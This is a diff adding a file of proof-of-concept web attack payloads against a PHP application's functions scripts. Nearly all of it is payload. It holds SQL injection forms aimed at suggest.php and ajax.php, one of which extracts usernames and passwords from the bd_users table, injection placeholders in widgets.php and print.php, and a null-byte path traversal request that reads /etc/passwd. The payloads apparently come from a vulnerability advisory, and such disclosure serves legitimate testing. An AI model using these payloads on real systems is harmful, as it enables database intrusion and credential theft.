@@ -1,0 +1,37 @@
+
+&lt;form action=&quot;http://www.example.com/functions/suggest.php&quot; 
+method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;return&quot; value=&quot;id`,version() AS version FROM 
+bd_users LIMIT 1 -- &quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;display&quot; value=&quot;version&quot; /&gt;
+&lt;input type=&quot;submit&quot; id=&quot;btn&quot;&gt;
+&lt;/form&gt;
+
+http://www.example.com/functions/widgets.php?action=get_widget&amp;id=[SQI]
+
+http://www.example.com/functions/print.php?category=[SQI]
+
+&lt;form action=&quot;http://www.example.com/functions/ajax.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;get_template&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;&#039; OR 1=(select min(@a:=1)from 
+(select 1 union select 2)k group by (select 
+concat(@@version,0x0,@a:=(@a+1)%2))) -- &quot; /&gt;
+&lt;input type=&quot;submit&quot; id=&quot;btn&quot;&gt;
+&lt;/form&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/functions/suggest.php&quot; 
+method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;return&quot; value=&quot;username&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;display&quot; value=&quot;password&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;table&quot; value=&quot;bd_users&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;search&quot; value=&quot;id&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;value&quot; value=&quot;%&quot; /&gt;
+&lt;input type=&quot;submit&quot; id=&quot;btn&quot;&gt;
+&lt;/form&gt;
+
+
+POST /functions/ajax.php HTTP/1.1 
+action=get_template&amp;name=../../../../../etc/passwd%00
+
